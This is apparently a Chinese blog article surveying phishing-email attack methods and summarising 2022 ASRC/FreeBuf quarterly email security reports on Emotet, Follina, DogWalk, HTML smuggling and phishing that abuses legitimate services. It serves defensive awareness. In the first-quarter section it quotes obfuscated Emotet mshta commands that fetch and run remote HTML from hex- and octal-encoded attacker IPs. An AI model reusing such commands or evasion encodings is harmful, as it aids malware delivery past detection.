# 论电子邮件系统的攻击

## 钓鱼邮件主流攻击方式

首先参考一位大佬的知乎

[钓鱼邮件主流攻击方式 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/162947481)

这是对于钓鱼邮件主流攻击方式的简述

### 0x01邮件正文插入恶意链接

这是一种最基础的攻击方式，就是在邮件正文中放入一个恶意诱导链接，等待用户进行点击，链接后面是一个伪造的网站，可能是一个恶意程序下载链接或者一个用于伪造的登录入口等。

现在大家都比较聪明，主要涉及的就是攻击者与大家警惕意识的博弈

攻击者通常会利用一些近期的热点事件以提高内容可信度，诱导用户点击链接。

对恶意链接尽心通过一定的伪装，伪装方式如下：

1、短链接

2、使用html标签伪造隐藏

3、近似URL

4、子域名

### 0x02 邮件附件藏毒

此类也是常见的一种，攻击者的payload含在邮件附件里，载体有直接的文档、图片、压缩包、脚本程序（exe、vbs、bat）等。

直接发送脚本程序诚然是最直接的，但是容易被邮箱安全机制拦截或者人员识破，但攻击者会使用一些伪装手段，如使用超长文件名隐藏后缀等。

### 0x03 利用软件漏洞攻击

此类做法主要是使用邮件进行投递攻击武器，武器本身利用了邮箱、客户端软件如浏览器、office、系统等本身的漏洞，此类攻击需要配合操作系统/浏览器的 0day 或者 Nday，而且需要对攻击者使用的终端应用软件进行比较精准的识别，因此攻击成本较高，但是最终的效果还是很不错的，如利用邮箱的xss漏洞获取了大量员工邮箱账户cookie信息。

### 0x04 利用邮件协议漏洞攻击

主要利用了邮箱本身安全设置问题，若邮箱地址没有设置spf，那么就会有人假冒真实域名发送邮件。

1、邮件伪造

可以使用swaks非常简单的向目标投送钓鱼邮件

2、邮件协议爆破

使用万能爆破工具hydra可以对常见邮件协议进行爆破

### 0x05 邮件发件人身份“伪造”

伪造可能是使用真实的发件人邮箱身份，如攻击者通过一些方式窃取了一些真实可信的邮箱身份。

当然还有一些曲线救国的方式，如果通过邮箱直接攻击B单位人员无法成功，那么攻击B单位的上级单位或者有较强业务往来的A单位人员邮箱，然后利用B对A的可信度，伪造邮件向其索要一些敏感信息或者要求安装一些异常软件等。实际的对抗中听过某攻击队通过此方式直接获得了目标单位全员信息（姓名、电话、邮箱、住址）。

## 对2022近三个季度的ASRC邮件安全报告总结

https://www.freebuf.com/

### 0x01 第一季度

转载于[ASRC 2022年第一季电子邮件安全观察 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/paper/332570.html)

2022第一季，所有企业都能明显感觉到的威胁邮件，即是Emotet的攻击。Emotet的攻击，使用了各种藏匿及混淆的手段，用以躲避防毒及网安防护软件的检测，而其中最重要的一个手段就是压缩加密。在传输附件前先经过「压缩加密」，这在过去的用途，多半是为了保护保密文件在传输过程中，不被传递路径的中间人取得或窥探的防护手段；而现在，却经常成为恶意软件用以躲避信息安全软件检测的保护伞。在滥用情况日趋恶化的情况下，也开始迫使企业开始重新思考是否改变保密数据的传递方式，而直接将邮件内的加密压缩文件视为可疑或威胁的来源。

ASRC 研究中心与守内安，分享在这一季观察到的几个特殊邮件案例：

**Emotet** **再度现身，以加密恶意附件躲避防御侦测**

虽然欧洲刑警组织（Europol）与其它8个国家的执法机构在2021年1月下旬，连手破获了Emotet僵尸网络，但新的Emotet服务器和恶意软件样本已于2021/11/14出现，并通过电子邮件大量散播。Emotet的垃圾邮件攻击行动所携带于邮件里的恶意Office文件多为xls、xlsx、xlsm、doc、docx、docm...等等，部分以zip加上密码的方式，躲避信息安全防御的侦测。当收件者不慎执行恶意Office文件内的宏，Office文件内纪录的 URL 列表即会被尝试下载，扩展名可能为 .ocx 文档，但实为 DLL 的文档。接着使用 regsvr/ 3/ 2.exe -s 指令，于收件者的 Windows 内执行 .ocx。

随后进行潜伏：将 .ocx 复制到用户目录下的「AppData\Local\随机目录名称」，并随机取名 xxxxxxx.yyy (x长度不定)，再将该 .ocx 删除。执行 C:\Windows\system32\regsvr 3 / 2.exe /s "C:\Users\用户名称AppData\Local\随机目录名称下的恶意文件，并通过 registry 设定开机执行。

较特别的是，用以隐匿恶意文件的连接，使用了多种手法躲避，例如：分别使用十六进制、八进制的方法，来存放远程服务器的IP地址，进而让 Emotet下载第2阶段的恶意软件，现行的信息安全防护系统很可能无法察觉情况。

以下为一个示例：

![img](https://image.3001.net/images/20220509/1652075358_6278ab5ef328f6556fac6.jpg!small)

使用十六进制搭配混淆手段，让许多URI格式的恶意指标侦测失灵

同一网址可表达为：

- 十进制格式: hxxp://185.7.214.7
- 十六进制格式: hxxp://0xb907d607
- 八进制格式: hxxp://0056.0151.0121.0114

以上格式，浏览器都可以解析。实际上在Office攻击文件中还搭配了混淆的手段，呈现为：

- cmd /c m^sh^t^a h^tt^p^:/^/[0x]b907d607/fer/fer.html
- cmd /c m^sh^t^a h^tt^p^:/^/0056[.]0151[.]0121[.]0114/c.html

这让许多URI格式的恶意指标侦测失灵。

![img](https://image.3001.net/images/20220509/1652075400_6278ab882f7f40d6bcc50.jpg!small)

以zip加上密码的方式，躲避信息安全防御工事的侦测

由于这一波的Emotet攻势，与2021第四季相比较，邮件中带有恶意Office文件的数量成长了近40%；邮件中带有恶意Zip文件，成长了近一倍。

**针对电商账号的钓鱼攻击**

在三月份，我们观察到针对特定电商的钓鱼邮件，这些钓鱼邮件主要诈骗的目标为电商平台的登入账号密码。在成功取得账户密码后，除了能利用电商进行一些虚假交易外，账号密码也可能被拿到其他的社群、电商、电子邮件登入入口尝试凭证填充 (Credential Stuffing) 攻击。钓鱼网站的域名都在近期申请，并利用三或四级域名并将电商品牌关键词包含在内，以获取收件人进一步的信任。

![img](https://image.3001.net/images/20220509/1652075485_6278abdd04587d98ee72a.jpg!small)

利用三或四级域名让收件者看到与电商相关的关键词从而放下戒心

**防范钓鱼邮件教学的钓鱼邮件**

在这一季发现一个有趣的案例：教人防范钓鱼邮件的教学，内容却是带有连接钓鱼网站的钓鱼邮件。正当我们好奇想了解这个网站想钓是哪些资料时，钓鱼页面已经显示这个页面遭到停权。

![img](https://image.3001.net/images/20220509/1652075598_6278ac4e403defd7a2869.jpg!small)

货真价实的钓鱼邮件，内容却为防范钓鱼邮件的教学

**利用俄乌战争话题的诈骗邮件**

广受关注的时事新闻一直都是黑客爱用的工具。2022年2月24日爆发俄乌战争，从3月初开始有大量假借战争募捐的诈骗邮件四处流窜。与过去常见的419scam不同的地方是，诈骗邮件的内容提及由于战争的关系，银行已经无法正常运营，因此募集的是加密货币，以比特币为主。

![img](https://image.3001.net/images/20220509/1652075627_6278ac6b78d6e77a67f24.jpg!small)

大量假藉战争募款相关的诈骗邮件募集的是加密货币

**日本政府与企业开始废除附件****ZIP** **加密的传输方**

在日本已运行多年，以附件ZIP加密码的信息安全防护方式简称为PPAP。PPAP是由4个词所组成，Password付きzipファイルを送ります、Passwordを送ります、An号化、Protocol（プロトコル）。一般指将电子邮件携带的附件，通过ZIP加密压缩，再将可以解压缩的密码，通过另一封邮件发给对方解密。PPAP的使用有许多疑虑与弊端存在：加密文件与密码经常使用相同的通讯管道分次传输、长久使用固定密码以及加密文件直接遭到拦截并被暴力破解的情况等，都说明了PPAP的使用并不安全。去年底至今年第一季度，日本有多个大型企业集团直接废除PPAP的传输方式，并宣布接收外部邮件时，将会直接过滤带有密码的压缩文件，这个决定恰与Emotet的卷土重来大量滥发的时间点不谋而合。

### 0x02 第二季度

转载于[守内安 & ASRC 2022第二季度邮件安全报告 - FreeBuf网络安全行业门户](https://www.freebuf.com/news/338280.html)

根据 ASRC 研究中心与守内安联合报告，本季来自电子邮件的攻击，仍以钓鱼邮件为主；其次是带有加密病毒附件的邮件，其数量较上个季度约增长4倍。通过大量联机攻击的次数约为上季度的两倍。同时本季度也有新的攻击手法及漏洞被发现，需对后续漏洞利用情况提高警惕。

**通过****PDF** **掩护夹带恶意****Office** **文件**

本季我们发现有夹带恶意 Office PDF的格式文件。这种恶意文件本体，是一个利用了 Excel 默认密码加密过的恶意 xls 文件，所利用的漏洞为 CVE-2017-11882，内嵌于 PDF 的附件内，利用 PDF 编码作为掩护，使得防毒或网络安全检测软件极难发现。当受害者不慎通过 Adobe Acrobat Reader 等 PDF 阅读工具开启了这个恶意的 PDF 文件时，会自动询问是否要开启其中的恶意附件，若受害者不慎同意开启，则恶意文件会立即在受害者的计算机上安装后门程序。要防范此类攻击，除了采用较好的网安查毒检测机制外，在打开文件时的任何软件警示最好都不要轻易忽视！

![img](https://image.3001.net/images/20220704/1656927575_62c2b557bcbda8f95f177.jpg!small)

夹带恶意软件的PDF 文件

![img](https://image.3001.net/images/20220704/1656927710_62c2b5de979033262a90b.jpg!small)

Adobe Acrobat Reader 等 PDF 阅读工具开启了这个恶意的 PDF 文件时，会自动询问是否要开启其中的恶意附件，若不同意则不会触发后续的恶意程序；若通过 Chrome等功能较单一的 PDF 阅读工具，打开时则不会显示该 PDF 内嵌有附件

![](https://image.3001.net/images/20220704/1656927739_62c2b5fb36fc93e21077a.jpg)

恶意代码内嵌于附件的 PDF 中，利用 PDF 编码作为掩护，使得防毒或网安检测软件极难辨识

**Follina** **攻击，通过电子邮件触发**

微软于 5 月 30 日公布位于 MSDT (MS Support Diagnostic Tool) 的 Windows 漏洞 CVE-2022-30190，这个漏洞被命名为 Follina，因为一开始发现的攻击文件名有着 0438 这个数字 (05-2022-0438.rar)，0438 是意大利 Follina 的区号，因而得名。这个漏洞是 Windows 本身的漏洞，但触发方式可通过电子邮件来进行：在电子邮件中以附件文件夹带一个恶意的 Office 文件或是 RTF格式文件，并利用 Office 程序向外抓取一个恶意的 HTML ，再借此恶意 HTML 使用「ms-msdt」MSProtocol URI scheme 以加载一段程序代码，触发 PowerShell 执行。

![img](https://image.3001.net/images/20220704/1656927763_62c2b613c420147d091d5.png!small)

透过 WORD 的 XML 向外请求恶意的 HTML ole 对象

![img](https://image.3001.net/images/20220704/1656927774_62c2b61eba9516fb5d14f.png!small)

恶意的 HTML 通过 Office 程序的权限执行后，使用「ms-msdt」MSProtocol URI scheme 以加载一段程序代码，触发 PowerShell 执行

**微软****MSDT** **延伸漏洞****- DogWalk**

与 Follina 同样是 MSDT 通过电子邮件的利用，另一种攻击方式，是通过电子邮件寄送恶意超链接的方式，令受害者下载一个恶意的 diagcab 文件，并以社交工程的方式诱骗受害者点击才能触发。触发后利用路径/目录穿越（Path Traversal），允许攻击者将任何文件，存在文件系统任何地方，比如 Windows 的「启动」文件夹中，进行长期的潜伏，并且这个过程完全是静默的。这种攻击方式有另一个昵称为 DogWalk。

**通过后台调用浏览器，解码藏在****HTML** **文件中的压缩文件**

在过去，将各种威胁文件隐藏在压缩文件里，是很常见的行为。因为压缩文件给了恶意软件一个外壳，需要进行解压缩才能分析，但这对于多数的杀毒分析机制都不是什么大问题。于是，攻击者在压缩文件加上密码，并于邮件中告知受害者密码，这就给了病毒附件机会躲过杀毒检测并执行后续的后门安装。我们在本季看到了一个有别于传统攻击手段的利用。

这个特别的利用方式是，在电子邮件的附件中放入一个 HTML 文件，当这个 HTML 被受害者点击后，便会“下载”一个加密的恶意文件。事实上，这并非真的从网络上“下载”一个恶意文件，而是通过浏览器，解码出内嵌于 HTML 内的一个加密恶意文件，由于这个文件不是从外部而来，因此浏览器的文件下载保护，及 Windows 内建的「网络标记」(Mark of the Web)保护也会因此失效。根据我们分析的恶意样本，加密的 zip 里是一个 PE 文件的后门程序。

![img](https://image.3001.net/images/20220704/1656927794_62c2b63220d19e80f3d66.jpg!small)

电子邮件的附件文件中放入一个 HTML 文件，再借由这个 HTML 被受害者点击后，下载一个加密的恶意文件

![img](https://image.3001.net/images/20220704/1656927810_62c2b64256f1cb5849c10.png!small)

通过浏览器，出内嵌于 HTML 内的一个加密恶意文件，文件并非从外部而来

**结论**

在电子邮件安全在早期还不受重视时，多数的收信软件或是 Webmail，几乎都能像浏览器一样完整的执行各种网页程序。随着时间推移，大家慢慢意识到电子邮件这个通道若不进行管控或限制，会是一个很容易被主动攻击的突破口。因此，现在的收信软件或是 Webmail 都不再能直接执行各种网页程序。攻击者在演化的过程中留意到了电子邮件可夹带各种附件的可能性，开始通过夹带各种恶意文件以利用这些文件开启软件的漏洞。HTML 可以调用本地浏览器开启，在过去经常被用来做脱机钓鱼，这次我们看到了脱机下载文件攻击样本，未来在呼叫浏览器的利用方面恐怕将更加深化及普及化。

### 0x03 第三季度

转载于

时间来到了今年第三季度，随着国际局势紧张，**带有恶意链接的攻击邮件较上一季爆增了4倍、带有HTML的钓鱼邮件则翻了3倍；且诈骗及APT攻击、漏洞的利用都较上季略有上升，**但整体垃圾邮件的数量、常见病毒邮件的数量都有所下降。值得注意的是**利用恶意PDF文件格式进行的攻击有明显增加的趋势。**以下为本季值得特别留意的特殊攻击手段：

**遭利用的Google翻译**

Google翻译本身支持了翻译整个网站的功能，并且可将翻译结果页以链接传送给他人，让他人也可直接看到翻译后的结果，翻译结果的网址是Google翻译的合法网址，所以若是将钓鱼网站交给Google翻译后，取得这个网址，再放入钓鱼邮件中传播，便可利用合法掩护躲过众多安全检测。

![115-2.png](https://image.3001.net/images/20221017/1665996500_634d16d4cb670da7ef726.png!small)



**(钓鱼网站由Google翻译后，穿上了白马甲)**



收件人万一点击链接则会直接跳转至钓鱼网站**且大部分浏览器的钓鱼保护功能不会提醒。**不过，如果我们仔细观察，还是能发现异常：我们可以看到Google翻译列的控制选项，正常的登入网站并不会出现。

![115-1.jpg](https://image.3001.net/images/20221017/1665996504_634d16d805e6d7d6f8c43.jpg!small)



**(识别的秘诀是，会看到Google的翻译列)**



除此之外，网站本身的原码也做了一些特定的编码保护，这有助于网络爬虫不易识别出这是一个钓鱼网站，也让这类钓鱼网站可以存活的更久。

![115-9.jpg](https://image.3001.net/images/20221017/1665996505_634d16d9608972e65a736.jpg!small)



**(网站本身的原码也做了编码保护以躲避爬虫检查)**



**利用 IPFS 协议续命**

在上述Google翻译被利用的例子，实际上钓鱼邮件的网址是：

![115-10.png](https://image.3001.net/images/20221017/1665996506_634d16da50c4309de1765.png!small)


而在经过了 Google 翻译之后，网址也会跟着改变。不过，**目前中国地区Google翻译服务已于今年 10月1日正式关闭，也算是从物理端解决了该问题，不过可能很快就能在其它平台看见利用此手段的钓鱼邮件。**

我们可以看见原始的网址主域为 infura-ipfs.io，这是利用了星际文件系统所实现的分布式储存。星际文件系统（InterPlanetary File System，缩写为IPFS）是一个旨在实现文件的分布式储存、共享和持久化的网络传输协议。它是一种内容可追溯的对等超媒体分发协议。**在 IPFS 网络中的节点构成一个分布式文件系统。**传统的恶意文件寄存于单一网站，一旦服务器宕机或联机断线，恶意文件或是钓鱼页面就无法使用。**但在 IPFS 上，文件可利用多个网络节点传送，确保内容长久保留，大幅度提高了恶意网站的生命周期，对于恶意流量的侦测也变得更加困难。**

![115-3.png](https://image.3001.net/images/20221017/1665996506_634d16dae55561eb65e86.png!small)



**(恶意页面或文件开始利用 IPFS 协议躲避封锁)**



**被利用的在线问卷**

钓鱼邮件内容简洁，主要以邀请聆听语音信息作为社交工程的诱骗手段，而语音信息的链接，则寄宿于微软 ncv.microsoft.com。

![115-4.png](https://image.3001.net/images/20221017/1665996507_634d16dbf0bfb0ce05139.png!small)



**(携带了位于 ncv.microsoft.com 的钓鱼链接)**


点击该链接时，会连到一个钓鱼的中介页面，**这个页面是存放在微软服务器上真实合法的网址与网页。但这个页面却附带有一个恶意的钓鱼链接，并利用了微软 Dynamics 365 Customer Voice 问卷调查功能，**为了避免受害者发现，中间被嵌入了大量的空白，让受害者不会直接看到微软 Dynamics 365 Customer Voice 问卷调查功能页的页尾。由于是以合法网域掩护的钓鱼网页，**浏览器不会弹出任何警告。**

![115-5.jpg](https://image.3001.net/images/20221017/1665996509_634d16dd17e3039b1ab95.jpg!small)



**(钓鱼攻击利用了微软的在线问卷调查机制)**



当受害者不慎点击真正的钓鱼链接页面时，并不会马上开始进行钓鱼动作，会先进行人机身份验证（CAPTCHA）筛除自动爬虫检测，让真正的钓鱼网站继续潜藏在暗处。

![115-6.png](https://image.3001.net/images/20221017/1665996510_634d16decb293886c207d.png!small)



**(人机验证（CAPTCHA），用以筛除自动爬虫检测)**



通过人机验证 CAPTCHA 测试后，来到真正钓鱼的阶段，其目标是为了骗取某些网络服务的密码。攻击者可能考虑到后续会大量运用发送钓鱼邮件，并为了增加可信度的需求，钓鱼网页会根据要骗取的电子邮件域名的不同，页面的Logo图案会有一些不同的变化。

![115-7.png](https://image.3001.net/images/20221017/1665996511_634d16df9a737fecdc80f.png!small)



**(为了骗取某些网络服务密码)**



![115-8.jpg](https://image.3001.net/images/20221017/1665996512_634d16e07e47fcfdf21df.jpg!small)



**(logo随页面变化)**



在这个例子中，可以看见钓鱼邮件用了众多方式，让人相信它的真实性，并且确认被钓鱼的对象是真实的人类。

**总结**

通过本季的几个案例可以观察到，配合攻击邮件的钓鱼网站除了大量地使用合法公用机制来掩护非法行动外，也会试图躲避安全人员的自动扫描检查，并且利用各种先进的技术设法提高钓鱼网站、恶意文件的存活时间。**攻击邮件中若不直接携带攻击程序或文件，多半都将其真正的攻击武器藏于外部的网站上，触发方式多数需要透过浏览器及社交工程手段。**因此，着重邮件安全的同时也需要留意浏览器的安全，并需要养成及时更新的好习惯。

## 总结

对上述报告总结后，以下三种是当前恶意电子邮件传播的最新技术。

1、网络钓鱼活动会冒充本地邮政服务或者重大会议活动以及HTML smuggling来传播恶意软件。使用这种技术，原本被电子邮件网关阻止的危险文件类型可能会传输到组织中并导致恶意软件感染。

2、利用零日漏洞，在受害者修复漏洞之前，分发QakBot、Agent Tesla和Remcos RAT（远程访问木马）。只要运行任意代码就可部署恶意软件，并且用户几乎不需要任何交互即可完成。

3、利用软件代码漏洞，传播恶意软件，在受害者设备中执行命令，从而窃取数据、破坏系统。